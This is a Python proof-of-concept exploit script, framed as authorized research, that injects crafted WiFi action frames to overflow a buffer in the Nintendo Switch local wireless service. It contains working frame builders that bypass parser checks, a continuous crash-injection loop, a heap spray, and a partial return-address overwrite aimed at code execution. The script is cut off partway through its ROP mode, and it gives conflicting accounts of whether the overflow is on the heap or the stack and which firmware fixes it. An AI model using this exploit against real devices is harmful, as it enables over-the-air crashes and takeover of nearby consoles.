#!/usr/bin/env python3
"""
lp2p Action Frame Injection PoC — SendActionFrame Heap Overflow
================================================================
Authorized owner security research on Nintendo Switch (XAW4 001878).
FW 22.5.0 (unfixed), fixed in 23.5.0.

Vulnerability: FUN_710003b470 memcpy(output+0x78, payload_ptr, payload_size)
  payload_size = uint16 at parser_state+0x1DA (big-endian, ntohs)
  payload_ptr  = parser_state+0x1DC
  Destination buffer: 0x798 bytes, available from 0x78 = 0x720 (1824) bytes
  Overflow if payload_size > 0x720

  Type 1 (body[0x21]=0x01): BLOCKED — parse caps payload_size < 0x181 (385)
  Type 3 (body[0x21]=0x03): EXPLOITABLE — no payload_size bounds check, no hash check

Overflow target: IPC output buffer (HEAP, not stack).
  IPC dispatcher FUN_7100036560 case 7 → FUN_7100037dc0 → FUN_710003b470.
  All 3 callers pass IPC buffers. nn::lmem::ExpHeapMemoryResource allocator.
  Heap spray via repeated frame injection can control metadata corruption.

Frame routing: frame_type != 0x102 → ring buffer 0x30f8 → vulnerable consumer

Requirements:
  - WiFi card with monitor mode + packet injection (phy0 confirmed)
  - Switch must be in lp2p scanning or active mode
  - scapy: pip install scapy

Usage:
  sudo python3 -Iu lp2p_action_frame_inject.py --iface wlp5s0 --mode scan
  sudo python3 -Iu lp2p_action_frame_inject.py --iface wlp5s0 --mode crash
  sudo python3 -Iu lp2p_action_frame_inject.py --iface wlp5s0 --mode probe
"""

import argparse
import hashlib
import os
import struct
import subprocess
import sys
import time
import json
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "action_frame_overflow"

LP2P_MAGIC = b"\x7f"
LP2P_TYPE = 0x04
LP2P_FRAME_TYPE_DATA = 0x0100
LP2P_FRAME_TYPE_ADVERTISE = 0x0101
FRAME_TYPE_EXCLUDED = 0x0102

BODY_PROTOCOL_TYPE_OFFSET = 0x21
BODY_HASH_LENGTH_OFFSET = 0x22
BODY_HASH_OFFSET = 0x28
BODY_HASH_SIZE = 0x20
BODY_HASHED_DATA_OFFSET = 0x48
BODY_PAYLOAD_SIZE_OFFSET = 0x1DA
BODY_PAYLOAD_DATA_OFFSET = 0x1DC
BODY_MIN_SIZE = 0x28
DEST_BUFFER_SIZE = 0x720

PROTOCOL_TYPE_PLAINTEXT = 0x01
PROTOCOL_TYPE_AES_GCM = 0x02
PROTOCOL_TYPE_ALT = 0x03

# Type 3 member validation offsets (relative to body_ptr = object+0x5C)
# FUN_7100046010 at 0x7100046010:
#   *(this+0x5D0) = body_ptr  (stores parse_state)
#   body_ptr[0x26] = max_members (1-8, LDRSB — signed byte)
#   body_ptr[0x27] = member_count (1..max_members, LDRSB)
#   ntohs(body_ptr[member_count * 0x30 + 0x28]) <= 0x180
#   body_ptr[0x1A] bit 7 must be clear (TBNZ check)
#   body_size-0x38 >= member_count * 0x30 + 0x2A
TYPE3_MAX_MEMBERS_OFFSET = 0x26
TYPE3_MEMBER_COUNT_OFFSET = 0x27
TYPE3_HEADER_FLAGS_OFFSET = 0x1A

NINTENDO_OUI = b"\x00\x22\xaa"


def build_lp2p_frame(frame_type=LP2P_FRAME_TYPE_DATA, version=0x01, body=b""):
    """Build a complete lp2p frame (12-byte header + body).

    The frame starts with the 802.11 vendor-specific action frame fields:
      byte 0:   0x7F (category = vendor-specific, doubles as lp2p magic)
      bytes 1-3: 00:22:AA (Nintendo OUI)
      byte 4:   0x04 (lp2p type)
      byte 5:   version
      bytes 6-7: frame_type (big-endian uint16)
      bytes 8-11: reserved (zeros)
      bytes 12+: body
    """
    header = LP2P_MAGIC
    header += NINTENDO_OUI
    header += bytes([LP2P_TYPE])
    header += bytes([version])
    header += struct.pack(">H", frame_type)
    header += bytes([0x00, 0x00, 0x00, 0x00])
    return header + body


def compute_body_hash(body):
    """Compute SHA-256 hash as the ldn parse gate does (FUN_7100046690).

    The parse method verifies body[0x28:0x48] by computing:
      SHA-256(body[0:0x28] || 32_zero_bytes || body[0x48:0x48+ntohs(body[0x22])])
    and comparing the result to body[0x28:0x48].

    FUN_710008a890 inits with standard SHA-256 IV (confirmed: 0x6a09e667...).
    No HMAC key — plain SHA-256.
    """
    hash_len = struct.unpack(">H", body[BODY_HASH_LENGTH_OFFSET:BODY_HASH_LENGTH_OFFSET + 2])[0]
    hashed_data_end = BODY_HASHED_DATA_OFFSET + hash_len
    if hashed_data_end > len(body):
        hashed_data_end = len(body)

    h = hashlib.sha256()
    h.update(bytes(body[:BODY_HASH_OFFSET]))
    h.update(b"\x00" * BODY_HASH_SIZE)
    h.update(bytes(body[BODY_HASHED_DATA_OFFSET:hashed_data_end]))
    return h.digest()


def build_type3_overflow_body(payload_size, payload_pattern=b"\x41", body_size=None):
    """Build a type 3 frame body — the EXPLOITABLE path.

    Type 3 (body[0x21]=0x03) has NO payload_size bounds check and NO SHA-256 hash
    verification. Parse chain: FUN_7100046cd0 (gate 1) → FUN_7100046010 (members).

    Gate 1 (FUN_7100046cd0):
      - Magic 7F 00 22 AA 04, frame_type=0x0101, body_size >= 0x60
      - body[0x20] <= 0x0F
      - Context comparison: ntohl(body[0x24..0x27]) vs *(this+0x5B8)
        For fresh objects, context is ZEROED. body[0x26]=1 causes mismatch.
        BNE path at 0x7100046da4 handles mismatch — NOT an error:
        requires body_size-0x38 == ntohs(body[0x22..0x23]), then continues.
      - FUN_71000435a0 copies body verbatim to object at this+0x5C
      - Post-copy: compares body[0:8]/body[8:16] against factory-zeroed fields
        → all-zero body prefix matches zeroed targets

    Member validation (FUN_7100046010):
      - Stores body_ptr (this+0x5C) at *(this+0x5D0) = parse_state
      - body[0x26] = max_members (1-8)
      - body[0x27] = member_count (signed, 1..max_members)
      - ntohs(body[member_count*48 + 0x28]) <= 0x180
      - body[0x1A] bit 7 clear
      - body_size-0x38 >= member_count*48 + 0x2A

    Data flow CONFIRMED: body data is copied verbatim from ring buffer to
    object at this+0x5C. Parse_state at this+0x5D0 points to this+0x5C.
    Payload_size accessor reads *(this+0x5D0)+0x1DA = this+0x5C+0x1DA =
    body[0x1DA] in the copied data. BODY_PAYLOAD_SIZE_OFFSET=0x1DA is CORRECT.
    """
    if body_size is None:
        body_size = 0x570

    body = bytearray(body_size)
    body[BODY_PROTOCOL_TYPE_OFFSET] = PROTOCOL_TYPE_ALT

    # Gate 1 BNE path size check: body_size-0x38 == ntohs(body[0x22])
    # Required because body[0x26]=1 causes context mismatch → BNE path
    struct.pack_into(">H", body, BODY_HASH_LENGTH_OFFSET, body_size - 0x38)

    body[TYPE3_MAX_MEMBERS_OFFSET] = 0x01
    body[TYPE3_MEMBER_COUNT_OFFSET] = 0x01
    body[TYPE3_HEADER_FLAGS_OFFSET] = 0x00

    member_data_field = 1 * 48 + 0x28  # member_count * 48 + 0x28 = 0x58
    if member_data_field + 2 <= body_size:
        struct.pack_into(">H", body, member_data_field, 0x0000)

    struct.pack_into(">H", body, BODY_PAYLOAD_SIZE_OFFSET, payload_size)

    payload_data_len = body_size - BODY_PAYLOAD_DATA_OFFSET
    if payload_data_len > 0:
        pattern = (payload_pattern * ((payload_data_len // len(payload_pattern)) + 1))[:payload_data_len]
        body[BODY_PAYLOAD_DATA_OFFSET:BODY_PAYLOAD_DATA_OFFSET + payload_data_len] = pattern

    return bytes(body)


def build_overflow_body(payload_size, payload_pattern=b"\x41", body_size=None,
                        protocol_type=PROTOCOL_TYPE_PLAINTEXT):
    """Build a type 1 frame body with controlled payload_size.

    NOTE: Type 1 parse caps payload_size < 0x181 (385 bytes) via FUN_71000456b0.
    This CANNOT overflow the 0x720-byte buffer. Use build_type3_overflow_body
    for the exploitable path (type 3, no bounds check).

    This function is kept for reference and for testing type 1 behavior.
    """
    if body_size is None:
        body_size = 0x570

    body = bytearray(body_size)

    body[BODY_PROTOCOL_TYPE_OFFSET] = protocol_type

    hash_len = 0x0500
    struct.pack_into(">H", body, BODY_HASH_LENGTH_OFFSET, hash_len)

    body[0x5E] = 0x01
    body[0x5F] = 0x01
    body[0x6A] = 0x01

    struct.pack_into(">H", body, BODY_PAYLOAD_SIZE_OFFSET, payload_size)

    payload_data_len = body_size - BODY_PAYLOAD_DATA_OFFSET
    if payload_data_len > 0:
        pattern = (payload_pattern * ((payload_data_len // len(payload_pattern)) + 1))[:payload_data_len]
        body[BODY_PAYLOAD_DATA_OFFSET:BODY_PAYLOAD_DATA_OFFSET + payload_data_len] = pattern

    digest = compute_body_hash(body)
    body[BODY_HASH_OFFSET:BODY_HASH_OFFSET + BODY_HASH_SIZE] = digest

    return bytes(body)


def build_safe_body(body_size=None, protocol_type=PROTOCOL_TYPE_PLAINTEXT):
    """Build a benign body (payload_size=0) for connection testing."""
    if body_size is None:
        body_size = 0x200
    body = bytearray(body_size)
    if body_size > BODY_PROTOCOL_TYPE_OFFSET:
        body[BODY_PROTOCOL_TYPE_OFFSET] = protocol_type
    if body_size > BODY_HASH_LENGTH_OFFSET + 2:
        struct.pack_into(">H", body, BODY_HASH_LENGTH_OFFSET, 0x100)
    if body_size > BODY_PAYLOAD_SIZE_OFFSET + 2:
        struct.pack_into(">H", body, BODY_PAYLOAD_SIZE_OFFSET, 0)
    if body_size > BODY_HASH_OFFSET + BODY_HASH_SIZE:
        digest = compute_body_hash(body)
        body[BODY_HASH_OFFSET:BODY_HASH_OFFSET + BODY_HASH_SIZE] = digest
    return bytes(body)


def build_action_frame(src_mac, dst_mac, bssid, frame_type, body, channel=6):
    """Build an 802.11 action frame containing the lp2p payload.

    Returns raw bytes (no RadioTap header) suitable for NL80211_CMD_FRAME.
    NL80211 expects: 802.11 MAC header + frame body (no RadioTap/FCS).
    """
    lp2p_payload = build_lp2p_frame(frame_type, body=body)

    frame = bytearray()
    frame += b"\xd0\x00"       # Frame Control: Action (type=0, subtype=13)
    frame += b"\x00\x00"       # Duration
    frame += mac_to_bytes(dst_mac)   # addr1 = destination
    frame += mac_to_bytes(src_mac)   # addr2 = source
    frame += mac_to_bytes(bssid)     # addr3 = BSSID
    frame += b"\x00\x00"       # Sequence Control
    frame += lp2p_payload      # Action frame body (starts with 0x7F category)
    return bytes(frame)


def mac_to_bytes(mac_str):
    """Convert MAC address string to bytes."""
    return bytes(int(b, 16) for b in mac_str.split(":"))


def setup_monitor_mode(iface):
    """Put interface into monitor mode."""
    print(f"[*] Setting up monitor mode on {iface}")

    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True)

    result = subprocess.run(["sudo", "iw", iface, "set", "monitor", "none"],
                           capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] Failed to set monitor mode: {result.stderr}")
        return False

    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True)

    result = subprocess.run(["iw", iface, "info"],
                           capture_output=True, text=True)
    if "monitor" in result.stdout.lower():
        print(f"[+] {iface} in monitor mode")
        return True
    else:
        print(f"[!] {iface} not in monitor mode")
        return False


def set_channel(iface, channel):
    """Set WiFi channel."""
    result = subprocess.run(["sudo", "iw", iface, "set", "channel", str(channel)],
                           capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Channel set to {channel}")
    else:
        print(f"[!] Failed to set channel: {result.stderr}")
    return result.returncode == 0


def scan_for_switch(iface, duration=30):
    """Scan for Nintendo Switch lp2p action frames.

    Look for vendor-specific action frames with Nintendo OUI (00:22:AA)
    or lp2p magic byte (0x7F).
    """
    try:
        from scapy.all import sniff, Dot11, Raw
    except ImportError:
        print("[!] scapy required: pip install scapy")
        return []

    print(f"[*] Scanning for Switch lp2p frames on {iface} for {duration}s...")
    print(f"[*] Switch must be in 'Send to Smartphone' or local wireless play mode")

    found_frames = []

    def frame_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.haslayer(Raw):
            raw = pkt[Raw].load
            if len(raw) > 4 and raw[0] == 127 and raw[1:4] == NINTENDO_OUI:
                src = pkt[Dot11].addr2 or "unknown"
                dst = pkt[Dot11].addr1 or "unknown"
                bssid = pkt[Dot11].addr3 or "unknown"
                frame_info = {
                    "src": src,
                    "dst": dst,
                    "bssid": bssid,
                    "raw_len": len(raw),
                    "lp2p_header": raw[4:16].hex() if len(raw) > 16 else raw[4:].hex(),
                    "time": datetime.now(timezone.utc).isoformat()
                }

                if len(raw) > 10:
                    ft = struct.unpack(">H", raw[10:12])[0] if len(raw) > 12 else 0
                    frame_info["frame_type"] = f"0x{ft:04x}"

                found_frames.append(frame_info)
                print(f"  [FOUND] src={src} dst={dst} type={frame_info.get('frame_type', '?')} len={len(raw)}")

    for ch in [1, 6, 11, 36, 44, 149]:
        set_channel(iface, ch)
        time.sleep(0.1)
        try:
            sniff(iface=iface, prn=frame_handler, timeout=duration // 6,
                  monitor=True, store=False)
        except Exception as e:
            print(f"  [!] Channel {ch} error: {e}")

    return found_frames


class NL80211Injector:
    """Send management frames via NL80211_CMD_FRAME.

    Works on Intel iwlwifi (AX210 etc.) while associated to the target AP.
    Raw scapy injection does NOT work on iwlwifi — the firmware silently
    drops frames sent via AF_PACKET in monitor mode.
    """

    def __init__(self, iface):
        import socket as _socket
        self._sock = _socket.socket(_socket.AF_NETLINK, _socket.SOCK_RAW, 16)
        self._sock.bind((os.getpid(), 0))
        self._sock.setblocking(False)
        self._ifindex = _socket.if_nametoindex(iface)
        self._family = self._get_family()
        self._seq = 10000

    def _get_family(self):
        import socket as _socket
        import random
        s = _socket.socket(_socket.AF_NETLINK, _socket.SOCK_RAW, 16)
        alt_pid = os.getpid() + random.randint(1, 999999)
        s.bind((alt_pid, 0))
        name = b'nl80211\x00'
        nla = struct.pack('HH', 4 + len(name), 2) + name
        if len(nla) % 4:
            nla += b'\x00' * (4 - len(nla) % 4)
        p = struct.pack('BBH', 3, 1, 0) + nla
        s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, os.getpid()) + p, (0, 0))
        data = s.recv(8192)
        s.close()
        nllen = struct.unpack_from('I', data, 0)[0]
        off = 20
        while off < nllen:
            nla_len, nla_type = struct.unpack_from('HH', data, off)
            if nla_type == 1:
                return struct.unpack_from('H', data, off + 4)[0]
            off += (nla_len + 3) & ~3
        raise RuntimeError("nl80211 family not found")

    @staticmethod
    def _nla(t, d):
        if isinstance(d, int):
            d = struct.pack('I', d)
        n = struct.pack('HH', 4 + len(d), t) + d
        if len(n) % 4:
            n += b'\x00' * (4 - len(n) % 4)
        return n

    def send(self, mgmt_frame, freq=2412):
        genlhdr = struct.pack('BBH', 59, 0, 0)
        nla_data = self._nla(3, self._ifindex) + self._nla(38, freq) + self._nla(51, mgmt_frame)
        payload = genlhdr + nla_data
        self._seq += 1
        nlhdr = struct.pack('IHHII', 16 + len(payload), self._family, 1, self._seq, os.getpid())
        self._sock.sendto(nlhdr + payload, (0, 0))

    def drain(self):
        while True:
            try:
                self._sock.recv(8192)
            except Exception:
                break

    def close(self):
        self._sock.close()


_nl80211_injector = None


def inject_frame(iface, frame):
    """Inject a single frame via NL80211_CMD_FRAME.

    frame is raw bytes (802.11 MAC header + body, no RadioTap).
    """
    global _nl80211_injector

    if _nl80211_injector is None:
        try:
            _nl80211_injector = NL80211Injector(iface)
            print(f"[+] Using NL80211_CMD_FRAME injection (works on iwlwifi)")
        except Exception as e:
            _nl80211_injector = False
            print(f"[!] NL80211 init failed: {e}")

    if _nl80211_injector:
        try:
            mgmt_bytes = bytes(frame) if not isinstance(frame, bytes) else frame
            _nl80211_injector.send(mgmt_bytes)
            _nl80211_injector.drain()
            return True
        except Exception as e:
            print(f"[!] NL80211 injection failed: {e}")
            return False

    print(f"[!] No injection method available")
    return False


def mode_scan(iface, args):
    """Scan mode: passively listen for Switch lp2p frames."""
    frames = scan_for_switch(iface, duration=args.duration)

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "scan_results.json"
    with open(path, "w") as f:
        json.dump({
            "mode": "scan",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "interface": iface,
            "frames_found": len(frames),
            "frames": frames
        }, f, indent=2)
    print(f"\n[+] Scan complete. {len(frames)} lp2p frames found. Evidence: {path}")
    return frames


def mode_probe(iface, args):
    """Probe mode: inject benign frames to test injection capability."""
    print("[*] Probe mode: testing frame injection (safe, payload_size=0)")

    src_mac = args.src_mac or "aa:bb:cc:dd:ee:ff"
    dst_mac = args.dst_mac or "ff:ff:ff:ff:ff:ff"
    bssid = args.bssid or "ff:ff:ff:ff:ff:ff"

    set_channel(iface, args.channel)

    for frame_type in [LP2P_FRAME_TYPE_ADVERTISE, LP2P_FRAME_TYPE_DATA, 0x0103]:
        body = build_safe_body(0x100)
        frame = build_action_frame(src_mac, dst_mac, bssid, frame_type, body)
        print(f"  Injecting frame_type=0x{frame_type:04x} body={len(body)}B ... ", end="")
        if inject_frame(iface, frame):
            print("OK")
        else:
            print("FAIL")
        time.sleep(0.5)

    print("[+] Probe complete. Check Switch behavior.")


def mode_join(iface, args):
    """Join mode: target the STACK overflow in the join handler (FUN_71000398b0).

    Attack chain (CVE-2026-82079 — CWE-121 stack-based buffer overflow):
      1. Switch creates lp2p group → state 4 (waiting for peer)
      2. App calls WaitForPeer IPC → enters FUN_71000398b0
      3. FUN_71000398b0 creates parser, calls FUN_710003c6b0
      4. FUN_710003c6b0 loops reading ring buffer 0x30f8 for 500ms
      5. Our injected frame is in ring buffer → parsed by FUN_710003b470
      6. If parser is type 2/3 (uncapped): memcpy overflows 0x798-byte STACK buffer
      7. Stack corruption → return address overwritten → ROP

    Strategy: inject continuously so frames are in the ring buffer when
    the 500ms window opens. The window opens repeatedly while the Switch
    waits for a peer (before phone connects via QR code).

    Also works during phone connection: when phone sends its join frame,
    the join handler processes queued frames from ring buffer.
    """
    import socket

    print("=" * 60)
    print("  CVE-2026-82079 — STACK OVERFLOW (Join Handler)")
    print("  Target: ldn sysmodule FUN_71000398b0 → FUN_710003c6b0")
    print("  Buffer: 0x798 bytes on stack, overflow at offset 0x78")
    print("  FW: 22.5.0 (unfixed), fixed 23.0.0")
    print("=" * 60)

    src_mac = args.src_mac or "22:7c:ce:e0:bd:56"
    dst_mac = args.dst_mac or "ec:c4:0d:f3:dc:db"
    bssid = args.bssid or "ec:c4:0d:f3:dc:db"
    freq = 2412

    overflow_size = args.overflow_size or 0x900
    body = build_type3_overflow_body(overflow_size, b"\x41")
    frame = build_action_frame(src_mac, dst_mac, bssid,
                               LP2P_FRAME_TYPE_ADVERTISE, body)

    print(f"\n[*] Frame config:")
    print(f"    src_mac:     {src_mac}")
    print(f"    dst_mac:     {dst_mac} (Switch BSSID)")
    print(f"    bssid:       {bssid}")
    print(f"    freq:        {freq} MHz (channel 1)")
    print(f"    type 3 body: 0x{len(body):04x} bytes, payload_size=0x{overflow_size:04x}")
    print(f"    overflow:    0x{overflow_size - DEST_BUFFER_SIZE:04x} bytes past buffer")
    print(f"    target:      stack buffer in FUN_71000398b0 (join handler)")

    def check_http():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('192.168.0.1', 80))
            s.sendall(b'GET /index.html HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
            data = s.recv(1024)
            s.close()
            return b'HTTP/' in data
        except Exception:
            return False

    def check_ping():
        r = subprocess.run(['ping', '-c', '1', '-W', '1', '192.168.0.1'],
                           capture_output=True)
        return r.returncode == 0

    duration = args.duration or 60
    delay = args.delay or 0.005
    batch_size = 50

    print(f"\n[*] Phase 1: Verify target is alive")
    if check_http():
        print(f"    HTTP server: UP")
    else:
        print(f"    HTTP server: DOWN (might still work via ring buffer)")
    if check_ping():
        print(f"    Ping:        OK")
    else:
        print(f"    Ping:        FAIL")

    print(f"\n[*] Phase 2: Continuous injection for {duration}s")
    print(f"    Inject rate: ~{int(1/delay)}/s, batch={batch_size}")
    print(f"    HTTP check every {batch_size} frames")
    print(f"    >>> Connect phone via QR code NOW to trigger join handler <<<")

    start = time.time()
    total_sent = 0
    total_fail = 0
    crash_detected = False
    crash_time = None

    try:
        while time.time() - start < duration:
            for _ in range(batch_size):
                if inject_frame(iface, frame):
                    total_sent += 1
                else:
                    total_fail += 1
                time.sleep(delay)

            elapsed = time.time() - start
            alive = check_http()
            status = "UP" if alive else "DOWN"
            print(f"    [{elapsed:5.1f}s] sent={total_sent} fail={total_fail} http={status}")

            if not alive and not crash_detected:
                ping_ok = check_ping()
                if not ping_ok:
                    crash_detected = True
                    crash_time = time.time() - start
                    print(f"\n  *** CRASH DETECTED at {crash_time:.1f}s! ***")
                    print(f"  *** HTTP down + ping down = sysmodule crashed ***")
                    print(f"  *** Check Switch for error code (2162-xxxx) ***")

                    for _ in range(100):
                        inject_frame(iface, frame)
                        time.sleep(0.002)
                    total_sent += 100
                    break
                else:
                    print(f"    HTTP down but ping OK — server busy, not crashed")

    except KeyboardInterrupt:
        print(f"\n[*] Stopped by user")

    print(f"\n{'=' * 60}")
    print(f"  Results:")
    print(f"    Total sent:    {total_sent}")
    print(f"    Total failed:  {total_fail}")
    print(f"    Duration:      {time.time() - start:.1f}s")
    print(f"    Crash:         {'YES at {:.1f}s'.format(crash_time) if crash_detected else 'NO'}")
    print(f"{'=' * 60}")

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "join_overflow_attempt.json"
    with open(path, "w") as f:
        json.dump({
            "mode": "join",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": "FUN_71000398b0 → FUN_710003c6b0 → FUN_710003b470",
            "vulnerability": "CVE-2026-82079 stack-based buffer overflow",
            "interface": iface,
            "freq": freq,
            "src_mac": src_mac, "dst_mac": dst_mac, "bssid": bssid,
            "overflow_size": f"0x{overflow_size:04x}",
            "body_size": f"0x{len(body):04x}",
            "protocol_type": "type 3 (plaintext, no payload_size cap)",
            "duration": duration,
            "delay": delay,
            "total_sent": total_sent,
            "total_fail": total_fail,
            "crash_detected": crash_detected,
            "crash_time": crash_time,
        }, f, indent=2)
    print(f"[+] Evidence: {path}")

    return crash_detected


def build_rop_body(target_offset, body_size=0x800):
    """Build a type 3 body with ROP payload for PC control.

    Stack layout of FUN_71000398b0 (join handler):
      Prologue: stp x29, x30, [sp, #-0x60]!; sub sp, sp, #0xa60
      Buffer at SP+0x128 (0x798 bytes), write starts at buffer+0x78 = FP-0x8C0
      Saved LR at FP+0x08 → payload offset 0x8C8 from write start
      Saved FP at FP+0x00 → payload offset 0x8C0 from write start

    Original LR = ldn_base + 0x36680 (call at 0x710003667c + 4)
    Lower 16 bits of LR offset: 0x6680 (fixed, ASLR is 2MB-aligned)
    Partial overwrite of lower 2 bytes redirects to ldn_base + 0x3XXXX

    Critical local variables in cleanup path (must be safe values):
      FP-0x48 (payload[0x878]): pointer, zero to skip
      FP-0x38 (payload[0x888]): pointer, zero to skip
      FP-0x20 (payload[0x8A0]): pointer, zero to skip
      FP-0x14 (payload[0x8AC]): flag byte

    Max WiFi frame body: 0x800 (2048 bytes) — iwlwifi ERANGE above this.
    Controlled payload data: 0x800 - 0x1DC = 0x624 bytes (offsets 0x000-0x623)
    LR at payload offset 0x8C8 is BEYOND controlled range → needs heap spray.

    Strategy: fill the controlled region with safe zeros, set payload_size to
    0x8CA (partial 2-byte overwrite), and rely on heap spray to place the
    target address at the LR position in the uncontrolled heap data.
    """
    # payload_size for partial LR overwrite: exactly 0x8C8 + 2 = 0x8CA
    payload_size = 0x8CA

    body = bytearray(body_size)
    body[BODY_PROTOCOL_TYPE_OFFSET] = PROTOCOL_TYPE_ALT  # 0x03
    struct.pack_into(">H", body, BODY_HASH_LENGTH_OFFSET, body_size - 0x38)
    body[TYPE3_MAX_MEMBERS_OFFSET] = 0x01
    body[TYPE3_MEMBER_COUNT_OFFSET] = 0x01
    body[TYPE3_HEADER_FLAGS_OFFSET] = 0x00

    member_data_field = 1 * 48 + 0x28  # 0x58
    if member_data_field + 2 <= body_size:
        struct.pack_into(">H", body, member_data_field, 0x0000)

    struct.pack_into(">H", body, BODY_PAYLOAD_SIZE_OFFSET, payload_size)

    # Payload region (body[0x1DC:]) is all zeros — safe for cleanup path
    # The LR at payload offset 0x8C8 is in the uncontrolled heap region.
    # We write our target offset's lower 2 bytes at the END of the body
    # (body[0x7FE:0x800]) so it's in the heap overflow region.
    # Also fill some positions in the body tail with the target pattern
    # for heap spray — when this body is copied past the parser object
    # boundary (parser is 0x5D8 bytes, body starts at parser+0x5C),
    # bytes from body[0x57C:0x800] overflow into the heap.
    target_lo = target_offset & 0xFF
    target_hi = (target_offset >> 8) & 0xFF
    target_bytes = bytes([target_lo, target_hi])

    # Fill the body overflow region (body[0x57C:0x800]) with the target pattern
    # so the heap gets sprayed with our target address at every alignment
    overflow_start = 0x57C  # = parser object size (0x5D8) - body offset (0x5C)
    for off in range(overflow_start, body_size - 1, 2):
        body[off] = target_lo
        body[off + 1] = target_hi

    return bytes(body), payload_size


def build_spray_body(target_offset, body_size=0x800):
    """Build a spray frame body — fills heap with target address pattern.

    These frames are injected BEFORE the overflow to fill the heap allocator's
    free list with blocks containing our target address at every alignment.
    When the parser is later allocated and the memcpy reads past its body,
    the adjacent heap data should contain our pattern.
    """
    body = bytearray(body_size)
    body[BODY_PROTOCOL_TYPE_OFFSET] = PROTOCOL_TYPE_ALT
    struct.pack_into(">H", body, BODY_HASH_LENGTH_OFFSET, body_size - 0x38)
    body[TYPE3_MAX_MEMBERS_OFFSET] = 0x01
    body[TYPE3_MEMBER_COUNT_OFFSET] = 0x01
    body[TYPE3_HEADER_FLAGS_OFFSET] = 0x00

    member_data_field = 1 * 48 + 0x28
    if member_data_field + 2 <= body_size:
        struct.pack_into(">H", body, member_data_field, 0x0000)

    # Small safe payload_size (no overflow)
    struct.pack_into(">H", body, BODY_PAYLOAD_SIZE_OFFSET, 0x0100)

    # Fill ALL payload data with the target pattern
    target_lo = target_offset & 0xFF
    target_hi = (target_offset >> 8) & 0xFF
    for off in range(BODY_PAYLOAD_DATA_OFFSET, body_size - 1, 2):
        body[off] = target_lo
        body[off + 1] = target_hi

    return bytes(body)


def mode_rop(iface, args):
    """ROP mode: attempt controlled PC via stack overflow + heap spray.

    Phase 1: Spray — flood ring buffer with frames containing target address
    Phase 2: Overflow — send the actual stack overflow frame
    Phase 3: Detect — check if crash/hang/clean return

    Target addresses (offsets within ldn binary):
      clean:  0x36680 — original return address (should NOT crash = PC control proof)
      hang:   0x3a36c — ret instruction (infinite loop = different crash pattern)
      crash:  0x41414 — intentional bad address (baseline crash)
    """
    import socket

    targets = {
        "clean": 0x36680,  # original LR → clean return
        "hang":  0x3a36c,  # ret → infinite loop
        "crash": 0x41414,  # bad addr → crash (baseline)
    }

    rop_target = getattr(args, 'rop_target', 'hang') or 'hang'
    if rop_target not in targets:
        try:
            target_offset = int(rop_target, 16)
        except ValueError:
            print(f"[!] Unknown target: {rop_target}. Use: clean/hang/crash/0xNNNNN")
            return
    else:
        target_offset = targets[rop_target]

    target_lo = target_offset & 0xFFFF

    print("=" * 60)
    print("  CVE-2026-82079 — ROP EXPLOIT (Heap Spray + Stack Overflow)")
    print(f"  Target: {rop_target} → offset 0x{target_offset:05x}")
    print(f"  LR partial overwrite: lower 2 bytes → 0x{target_lo:04x}")
    print(f"  ASLR bypass: 2-byte partial overwrite (lower 16 bits deterministic)")
    print("=" * 60)

    src_mac = args.src_mac or "22:7c:ce:e0:bd:56"
    dst_mac = args.dst_mac or "ec:c4:0d:f3:dc:db"
    bssid = args.bssid or "ec:c4:0d:f3:dc:db"
    freq = 2412

    # Build frames
    spray_body = build_spray_body(target_lo)
    spray_frame = build_action_frame(src_mac, dst_mac, bssid,
                                     LP2P_FRAME_TYPE_ADVERTISE, spray_body)

    rop_body, payload_size = build_rop_body(target_lo)
    rop_frame = build_action_frame(src_mac, dst_mac, bssid,
                                   LP2P_FRAME_TYPE_ADVERTISE, rop_body)

    print(f"\n[*] Frame config:")
    print(f"    src_mac:      {src_mac}")
    print(f"    dst_mac:      {dst_mac}")
    print(f"    bssid:        {bssid}")
    print(f"    spray body:   0x{len(spray_body):04x} bytes (payload_size=0x0100, safe)")
    print(f"    rop body:     0x{len(rop_body):04x} bytes (payload_size=0x{payload_size:04x})")
    print(f"    target:       0x{target_lo:04x} (LE: [{target_lo & 0xFF:02x} {(target_lo >> 8) & 0xFF:02x}])")
    print(f"    LR offset:    0x8C8 from write start (confirmed from assembly)")

    def check_http():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('192.168.0.1', 80))
            s.sendall(b'GET /index.html HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
            data = s.recv(1024)
            s.close()
            return b'HTTP/' in data
        except Exception:
            return False

    def check_ping():
        r = subprocess.run(['ping', '-c', '1', '-W', '1', '192.168.0.1'],
                           capture_output=True)
        return r.returncode == 0

    print(f"\n[*] Phase 0: Verify target alive")
    http_up = check_http()
    ping_up = check_ping()
    print(f"    HTTP: {'UP' if http_up else 'DOWN'}")
    print(f"    Ping: {'OK' if ping_up else 'FAIL'}")
    if not ping_up:
        print("[!] Target not reachable. Exiting.")
        return

    spray_count = args.count or 300
    duration = args.duration or 120
    delay = args.delay or 0.002

    # Phase 1: Heap spray
    print(f"\n[*] Phase 1: Heap spray ({spray_count} frames)")
    print(f"    Filling heap with target pattern 0x{target_lo:04x}...")
    spray_sent = 0
    spray_fail = 0
    for i in range(spray_count):
        if inject_frame(iface, spray_frame):
            spray_sent += 1
        else:
            spray_fail += 1
        if (i + 1) % 100 == 0:
            print(f"    Sprayed {i + 1}/{spray_count}")
        time.sleep(0.001)
    print(f"    Spray complete: {spray_sent} sent, {spray_fail} failed")

    # Phase 2: Overflow injection (mixed spray + overflow)
    print(f"\n[*] Phase 2: Overflow injection for {duration}s")
